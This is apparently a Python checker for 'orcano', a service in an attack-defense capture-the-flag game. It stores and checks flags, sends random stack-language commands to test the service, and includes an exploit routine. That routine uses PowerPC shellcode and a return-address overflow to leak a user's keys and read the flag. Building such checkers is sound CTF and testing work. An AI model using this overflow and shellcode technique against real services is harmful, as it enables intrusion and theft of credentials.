#!/usr/bin/env python3

from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import SimpleSocket, assert_equals, assert_in

import secrets
import re
import struct
import base64

def rand_uint(below=2**31):
	return secrets.randbelow(below)
def rand_sint(below=2**31):
	raw = rand_uint(below)
	if rand_bool():
		raw = -raw
	return raw
def rand_bool():
	return secrets.choice([True, False])

def chunks(l, n):
	for i in range(0, len(l), n):
		yield l[i:i+n]
def secret_shuffle(l):
	for i in range(len(l)):
		j = secrets.randbelow(i + 1)
		t = l[j]
		l[j] = l[i]
		l[i] = t
PROMPT_TEXT = "> "

class OrcanoChecker(BaseChecker):
	flag_variants = 1
	noise_variants = 1
	havoc_variants = 7
	exploit_variants = 1
	service_name = "orcano"
	port = 53273

	# Helpers
	def make_cmd(self, cmd, args = []):
		text = ""
		for arg in reversed(args):
			if isinstance(arg, int):
				text += "{} ".format(arg)
			else:
				raise EnoException("make_cmd bad arg type {}".format(type(arg)))
		text += cmd
		return text

	def flag_to_nums(self, flag):
		nums = []
		chunk_len = 3;
		flag_data = flag.encode()
		for ck in chunks(flag_data, chunk_len):
			num = 0
			for i in range(chunk_len):
				num <<= 8
				if i < len(ck):
					num |= ck[i]
			nums.append(num)
		return nums
	def flag_from_nums(self, nums):
		flag_data = bytearray()
		chunk_len = 3
		for n in nums:
			remaining = n
			num_chars = bytearray()
			for i in range(chunk_len):
				d = remaining & 0xff
				remaining >>= 8
				if d == 0:
					continue
				num_chars.append(d)
			flag_data += num_chars[::-1]
			if len(num_chars) != chunk_len:
				break
		return flag_data.decode()

	def gen_uid(self):
		uid0 = rand_sint()
		uid1 = rand_sint()
		return uid0, uid1
	def gen_key(self):
		key0 = rand_sint()
		key1 = rand_sint()
		return key0, key1
	def save_uid(self, uid):
		uid0, uid1 = uid
		return {
			"uid0": uid0,
			"uid1": uid1,
		}
	def save_key(self, key):
		key0, key1 = key
		return {
			"key0": key0,
			"key1": key1,
		}
	def load_uid(self):
		uid0 = self.chain_db["uid0"]
		uid1 = self.chain_db["uid1"]
		return uid0, uid1
	def load_key(self):
		key0 = self.chain_db["key0"]
		key1 = self.chain_db["key1"]
		return key0, key1
	def uid_to_attack_info(self, uid):
		uid0, uid1 = uid
		return "{} {} user".format(uid1, uid0)
	def uid_from_attack_info(self, attack_info):
		m = re.fullmatch(r"([-+]?\d+) ([-+]?\d+) user", self.attack_info)
		if not m:
			raise BrokenServiceException("bad attack_info")
		uid1 = int(m[1])
		uid0 = int(m[2])
		return uid0, uid1

	def make_user(self, uid, key):
		uid0, uid1 = uid
		key0, key1 = key
		return self.make_cmd("user", [uid0, uid1, key0, key1])
	def make_user_rand(self):
		return self.make_user(self.gen_uid(), self.gen_key())

	def begin_conn(self):
		conn = self.connect()

		# Reconfigure timeouts to actually use all the time we are alotted.
		def timeout_fun():
			return max(1, getattr(self, "timeout", 30) - self.time_running - 3)
		conn.timeout_fun = timeout_fun

		welcome = conn.read_until(PROMPT_TEXT.encode())
		if not welcome:
			raise BrokenServiceException("read_until welcome timeout")
		self.debug("begin_conn: Got welcome: {}".format(welcome))
		# TODO: Test welcome text
		return conn

	def end_conn(self, conn):
		conn.write("\n")
		conn.close()

	def make_request(self, conn, cmds):
		# TODO: Randomize spacing
		request_text = " ".join(cmds)
		self.debug("make_request: sending {}".format(request_text))
		request_text += "\n"
		conn.write(request_text.encode())

		# Receive response and parse
		response = conn.read_until(PROMPT_TEXT.encode())
		if not response:
			self.debug("read_until request remainder: ", conn.read())
			raise BrokenServiceException("read_until request timeout")
		self.debug("make_request: got {}".format(response))
		lines = response.split(b"\n")
		try:
			lines = [l.decode() for l in lines]
		except UnicodeError:
			raise BrokenServiceException("Invalid characters returned from request")

		# Check prompt
		if len(lines) < 1:
			raise BrokenServiceException("Insufficient output returned from request")
		if lines[-1] != PROMPT_TEXT:
			raise BrokenServiceException("Bad prompt returned from request")
		# Trim off prompt
		lines = lines[:-1]

		# Prepare result
		result = {}

		# Check for error line
		ok = True
		if len(lines) > 0:
			ERROR_PREFIX = "error: "
			last_line = lines[-1]
			if last_line.startswith(ERROR_PREFIX):
				ok = False
				result["err"] = last_line[len(ERROR_PREFIX):]
				lines = lines[:-1]
		result["ok"] = ok

		out = []
		for l in lines:
			try:
				out.append(int(l))
			except ValueError:
				raise BrokenServiceException("Non-number returned from request")
		result["out"] = out

		return result

	def single_request(self, cmds):
		conn = self.begin_conn()
		result = self.make_request(conn, cmds)
		self.end_conn(conn)
		return result

	def single_request_expect(self, cmds, expect_out, expect_mid=[]):
		# HACK: Append dump commands
		expect_out = list(expect_out)
		for i in range(len(expect_out)):
			cmds.append("!")
			cmds.append("~")

		r = self.single_request(cmds)
		if not r["ok"]:
			self.debug("{}: expected OK, got error {}".format(self.action_title, r["err"]))
			if r["err"] == "timeout":
				fail_type = "timeout"
			else:
				fail_type = "error"
			raise BrokenServiceException("{}: unexpected {}".format(self.action_title, fail_type))
		# TODO(orcanojr): Fix the rest of this
		if tuple(r["out"]) != tuple(expect_out):
			self.debug("{}: expected {}, got {}".format(self.action_title, tuple(expect_out), tuple(r["out"])))
			raise BrokenServiceException("{}: unexpected result".format(self.action_title))
		return r

	def single_request_expect_fail(self, cmds, expect_err=None, expect_mid=None):
		# HACK: Append dump commands
		# SYNC: w/ single_request_expect
		expect_out = list(expect_out)
		for i in range(len(expect_out)):
			cmds.append("!")
			cmds.append("~")

		r = self.single_request(cmds)
		if r["ok"]:
			raise BrokenServiceException("{}: unexpected success", self.action_title)
		if expect_err != None and r["err"] != expect_err:
			self.debug("{}: expected {}, got {}".format(self.action_title, expect_err, r["err"]))
			if r["err"] == "timeout":
				fail_type = "timeout"
			else:
				fail_type = "kind of error"
			raise BrokenServiceException("{}: unexpected {}".format(self.action_title, fail_type))
		return r

	def make_put_data(self, nums):
		cmds = []
		# TODO: We can shuffle these
		cmds += [self.make_cmd("setn", [i, n]) for i, n in enumerate(nums)]
		cmds += [self.make_cmd("lockn", [i]) for i, n in enumerate(nums)]
		return cmds

	def make_get_data(self, count):
		cmds = []
		# TODO: We can shuffle these
		for i in range(count):
			cmds.append(self.make_cmd("getn", [i]))
			cmds.append("!")
			cmds.append("~")
		return cmds

	# Entrypoints
	def putflag(self):
		self.action_title = "putflag"
		if self.variant_id == 0:
			# Encode flag into numbers
			nums = self.flag_to_nums(self.flag)

			uid = self.gen_uid()
			key = self.gen_key()
			db = {}
			db |= self.save_uid(uid)
			db |= self.save_key(key)
			self.chain_db = db

			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += [self.make_cmd("lockn", [0x20000000])]
			cmds += [self.make_cmd("lockn", [0x20000001])]
			cmds += self.make_put_data(nums)

			conn = self.begin_conn()
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("putflag request error")

			return self.uid_to_attack_info(uid)
		else:
			raise EnoException("putflag bad variant_id")
	def getflag(self):
		self.action_title = "getflag"
		if self.variant_id == 0:
			try:
				uid = self.load_uid()
				key = self.load_key()
			except:
				raise BrokenServiceException("previous putflag failed")

			expected_nums = self.flag_to_nums(self.flag)

			conn = self.begin_conn()
			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += self.make_get_data(len(expected_nums))
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("getflag request error")

			got_nums = result["out"]
			assert_equals(
				tuple(got_nums),
				tuple(expected_nums),
				message="getflag incorrect flag"
			)
		else:
			raise EnoException("getflag bad variant_id")

	def putnoise(self):
		self.action_title = "putnoise"
		if self.variant_id == 0:
			# TODO: Other types of noise.
			nums = [rand_sint() for i in range(1 + secrets.randbelow(20))]

			uid = self.gen_uid()
			key = self.gen_key()
			db = {}
			db |= self.save_uid(uid)
			db |= self.save_key(key)
			db["data"] = nums
			self.chain_db = db

			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += [self.make_cmd("lockn", [0x20000000])]
			cmds += [self.make_cmd("lockn", [0x20000001])]
			cmds += self.make_put_data(nums)

			conn = self.begin_conn()
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("putnoise request error")
		else:
			raise EnoException("putnoise bad variant_id")
	def getnoise(self):
		self.action_title = "getnoise"
		if self.variant_id == 0:
			try:
				uid = self.load_uid()
				key = self.load_key()
				expected_nums = self.chain_db["data"]
			except:
				raise BrokenServiceException("previous putnoise failed")

			conn = self.begin_conn()
			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += self.make_get_data(len(expected_nums))
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("getnoise request error")

			assert_equals(
				tuple(result["out"]),
				tuple(expected_nums),
				message="getnoise incorrect data"
			)
		else:
			raise EnoException("putnoise bad variant_id")

	def havoc(self):
		self.action_title = "havoc"

		# TODO(orcanojr): Fix these for junior
		if self.variant_id == 0:
			self.action_title = "havoc <integer>"
			val = rand_sint()
			cmds = [str(val)]
			self.single_request_expect(cmds, [int(val)])
		elif self.variant_id == 1:
			self.action_title = "havoc ~"
			count = secrets.randbelow(32) + 1
			vals = [rand_sint() for i in range(count)]
			cmds = []
			for val in vals:
				cmds += [str(val)]
			cmds += [self.make_cmd("~")]
			self.single_request_expect(cmds, reversed(vals[:-1]))
		elif self.variant_id == 2:
			self.action_title = "havoc +"
			lhs = rand_sint(2 ** 20)
			rhs = rand_sint(2 ** 20)
			cmds = [self.make_cmd("+", [lhs, rhs])]
			self.single_request_expect(cmds, [lhs + rhs])
		elif self.variant_id == 3:
			self.action_title = "havoc *"
			lhs = rand_sint(2 ** 14)
			rhs = rand_sint(2 ** 14)
			cmds = [self.make_cmd("*", [lhs, rhs])]
			self.single_request_expect(cmds, [lhs * rhs])
		elif self.variant_id == 4:
			self.action_title = "havoc getn"
			idx = rand_uint()
			cmds = []
			cmds.append(self.make_user_rand())
			cmds += [self.make_cmd("getn", [idx])]
			self.single_request_expect(cmds, [0])
		elif self.variant_id == 5:
			self.action_title = "havoc setn"
			idx = rand_uint()
			val = rand_sint()
			cmds = []
			cmds.append(self.make_user_rand())
			cmds += [self.make_cmd("setn", [idx, val])]
			cmds += [self.make_cmd("getn", [idx])]
			self.single_request_expect(cmds, [val])
		elif self.variant_id == 6:
			self.action_title = "havoc lockn"
			idx = rand_uint()
			val = rand_sint()
			new_val = rand_sint()
			cmds = []
			cmds.append(self.make_user_rand())
			cmds += [self.make_cmd("setn", [idx, val])]
			cmds += [self.make_cmd("getn", [idx])]
			cmds += [self.make_cmd("lockn", [idx])]
			cmds += [self.make_cmd("getn", [idx])]
			cmds += [self.make_cmd("setn", [idx, new_val])]
			cmds += [self.make_cmd("getn", [idx])]
			self.single_request_expect(cmds, [val, val, val])
		else:
			raise EnoException("havoc bad variant_id")

	def exploit(self):
		self.action_title = "exploit"
		if self.variant_id == 0:
			if not self.attack_info:
				raise BrokenServiceException("exploit no attack_info")
			uid0, uid1 = self.uid_from_attack_info(self.attack_info)

			# Retrieve keys
			# SYNC: exploit.S
			shellcode = [
				0x3C600123, 0x60634567, 0x3C8089AB, 0x6084CDEF, # 0
				0x3CA02000, 0x60A50000, 0x3CC08000, 0x60C64BE0, # 4
				0x7CC903A6, 0x4E800421, 0x3CC08000, 0x60C64F3C, # 8
				0x7CC903A6, 0x4E800421, 0x3C600123, 0x60634567, # 12
				0x3C8089AB, 0x6084CDEF, 0x3CA02000, 0x60A50001, # 16
				0x3CC08000, 0x60C64BE0, 0x7CC903A6, 0x4E800421, # 20
				0x3CC08000, 0x60C64F3C, 0x7CC903A6, 0x4E800421, # 24
				0x3CC08000, 0x60C64F84, 0x7CC903A6, 0x4E800421, # 28
			]

			# Patch payload
			def patch_li_const(data, offset, val):
				data[offset + 0] &= 0xffff0000
				data[offset + 0] |= (val >> 16) & 0xffff
				data[offset + 1] &= 0xffff0000
				data[offset + 1] |= (val >> 0) & 0xffff

			patch_li_const(shellcode, 0, uid0)
			patch_li_const(shellcode, 2, uid1)
			patch_li_const(shellcode, 14, uid0)
			patch_li_const(shellcode, 16, uid1)

			# consts
			# SYNC: image.elf
			ret_offset = 275 # offset of return address
			current_stack = (
				0x80049940 # measured in main
				-1104 # reversed from processRequest
			)
			jump_target = current_stack + 0x8

			payload = shellcode
			payload += (ret_offset - len(payload)) * [8] # padding
			payload += [jump_target]

			# Sign extend
			def signed_truncate(val, bits = 32):
				new_val = val
				new_val &= (2 ** bits - 1)
				if new_val >= 2 ** (bits - 1):
					new_val -= (2 ** bits)
				return new_val
			payload = map(signed_truncate, payload)
			cmd = " ".join([str(x) for x in payload])

			# Pwn
			result_pwn = self.single_request([cmd])
			if not result_pwn["ok"]:
				raise BrokenServiceException("exploit shellcode failed")
			if len(result_pwn["out"]) != 2:
				raise BrokenServiceException("")

			key0 = result_pwn["out"][0]
			key1 = result_pwn["out"][1]

			uid = (uid0, uid1)
			key = (key0, key1)

			# Retrieve data
			conn = self.begin_conn()
			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += self.make_get_data(32)
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("exploit retrieve request error")

			nums = result["out"]
			got_flag = self.flag_from_nums(nums)
			self.debug("Got flag: {}".format(got_flag))
			if not self.search_flag(got_flag):
				raise BrokenServiceException("exploit no flag")

			return got_flag
		else:
			raise EnoException("exploit bad variant_id")

app = OrcanoChecker.service
if __name__ == "__main__":
	run(OrcanoChecker)